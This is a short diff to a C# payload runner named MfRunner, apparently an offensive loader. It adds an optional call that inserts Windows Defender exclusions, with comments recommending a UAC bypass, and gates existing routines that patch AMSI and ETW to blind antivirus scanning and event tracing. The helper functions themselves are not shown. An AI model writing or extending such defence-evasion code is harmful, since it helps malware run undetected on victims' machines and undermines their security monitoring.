@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Collections.Generic;
 using System.Linq;
@@ -65,9 +65,18 @@ namespace MfRunner
 #endif
 #endif
                     }
+#if DEFENDER_EXCLUSION
+                    // Add Windows Defender exclusions (requires elevation for silent operation)
+                    // Works best when combined with UAC bypass
+                    AddDefenderExclusion();
+#endif
+                    // AMSI and ETW patches are only needed for .NET payloads
+                    // Native payloads use syscalls and don't need these patches
+#if !NATIVE
                     AmsiAddress = (long)CustomLoadLibraryExA("amsi.dll", IntPtr.Zero, 0x800);
                     PatchAMSI();
                     PatchETW();
+#endif
 
                 } else
                 {
